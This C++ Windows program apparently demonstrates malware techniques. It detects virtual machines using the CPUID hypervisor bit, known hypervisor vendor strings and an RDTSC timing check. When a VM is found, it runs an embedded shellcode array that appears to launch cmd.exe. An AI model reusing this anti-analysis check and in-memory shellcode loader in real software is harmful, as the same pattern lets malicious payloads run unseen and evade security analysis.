#include <windows.h>
#include <intrin.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

bool IsVM()
{
    int cpuInfo[4] = {};

    //
    // Upon execution, code should check bit 31 of register ECX
    // (the “hypervisor present bit”). If this bit is set, a hypervisor is present.
    // In a non-virtualized environment, the bit will be clear.
    //
    __cpuid(cpuInfo, 1);
    
    if (!(cpuInfo[2] & (1 << 31)))
        return false;
    
    //
    // A hypervisor is running on the machine. Query the vendor id.
    //
    const auto queryVendorIdMagic = 0x40000000;
    __cpuid(cpuInfo, queryVendorIdMagic);

    const int vendorIdLength = 13;
    using VendorIdStr = char[vendorIdLength];

    VendorIdStr hyperVendorId = {};
    
    memcpy(hyperVendorId + 0, &cpuInfo[1], 4);
    memcpy(hyperVendorId + 4, &cpuInfo[2], 4);
    memcpy(hyperVendorId + 8, &cpuInfo[3], 4);
    hyperVendorId[12] = '\0';

    static const VendorIdStr vendors[]{
    "KVMKVMKVM\0\0\0", // KVM 
    "Microsoft Hv",    // Microsoft Hyper-V or Windows Virtual PC */
    "VMwareVMware",    // VMware 
    "XenVMMXenVMM",    // Xen 
    "prl hyperv  ",    // Parallels
    "VBoxVBoxVBox"     // VirtualBox 
    };

    for (const auto& vendor : vendors)
    {
        if (!memcmp(vendor, hyperVendorId, vendorIdLength))
            return true;
    }

    return false;
}

bool IsVMRunning()
{
#if _WIN64
    UINT64 time1 = __rdtsc();
    UINT64 time2 = __rdtsc();
    return ((time2 - time1) > 500);
#else
    unsigned int time1 = 0;
    unsigned int time2 = 0;
    __asm
    {
        RDTSC
        MOV time1, EAX
        RDTSC
        MOV time2, EAX
    }
    return ((time2 - time1) > 500);
#endif
}

int main()
{
    if (!IsVM() and !IsVMRunning())
    {
        MessageBox(NULL, L"Hi there!", L"Greetings.exe", MB_OK);
    }
    else
    {
        MessageBox(NULL, L"Oh, no, It's VM!", L"Sad.exe", MB_OK);

        unsigned char shellcode[] =
            "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
            "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
            "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
            "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
            "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
            "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
            "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
            "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
            "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
            "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
            "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
            "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
            "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
            "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
            "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
            "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"
            "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
            "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
            "\x24\x20\x57\xFF\xD0";

        void (*func)();
        func = (void(*)())(void*)shellcode;
        (void)(*func)();

        system("PAUSE");
    }
    system("pause");
    return 0;
}
